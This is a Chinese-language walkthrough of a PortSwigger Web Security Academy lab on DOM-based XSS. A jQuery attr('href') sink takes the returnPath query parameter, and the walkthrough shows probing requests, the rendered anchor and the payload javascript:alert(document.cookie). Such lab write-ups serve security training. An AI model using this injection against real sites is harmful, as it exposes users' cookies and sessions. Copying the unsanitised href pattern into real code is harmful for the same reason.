# 实验：在使用 `location.search` 作为源的 jQuery 锚点 `href` 属性汇点中的 DOM XSS**

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink

本实验在提交反馈（submit feedback）页面中包含一个基于 DOM 的跨站脚本（XSS）漏洞。它使用了 jQuery 库的 `$` 选择器函数来查找一个锚点（anchor）元素，并利用来自 `location.search` 的数据更改其 `href` 属性。

为了解决本实验，请让“返回”（back）链接触发弹窗显示 `document.cookie` 的内容。

## 步骤

探测
- 从根目录 `/` 访问 `Submit feedback` 功能
    ```http
    GET /feedback?returnPath=/ HTTP/2
    ```

    - 响应

        ```html
        <script src="/resources/js/jquery_1-8-2.js"></script>
        <div class="is-linkback">
            <a id="backLink">Back</a>
        </div>
        <script>
            $(function() {
                $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
            });
        </script>
        ```
        - 显示 jquery 库被加载
        - 源 `window.location.search`，参数 `returnPath` 
        - 汇 `$('#backLink').attr("href"` 元素选择器设置 `href` 属性
        - 上下文 `<a id="backLink">Back</a>` 锚点元素的 `href` 属性

    - 浏览器渲染
        ```html
        <a id="backLink" href="/">Back</a>
        ```
测试
- 设置查询参数 `returnPath` 的参数值为独特字符串 `/xn7aubds`
    ```http
    GET /feedback?returnPath=/xn7aubds HTTP/2
    ```
    - 浏览器渲染
        ```html
        <a id="backLink" href="/xn7aubds">Back</a>
        ```

攻击
- 载荷为 JS 伪协议 `javascript:alert(document.cookie)`
    ```http
    GET /feedback?returnPath=javascript:alert(document.cookie) HTTP/2
    ```
    - 浏览器渲染
        ```html
        <a id="backLink" href="javascript:alert(document.cookie)">Back</a>
        ```
    - 点击返回链接后触发 JS 执行
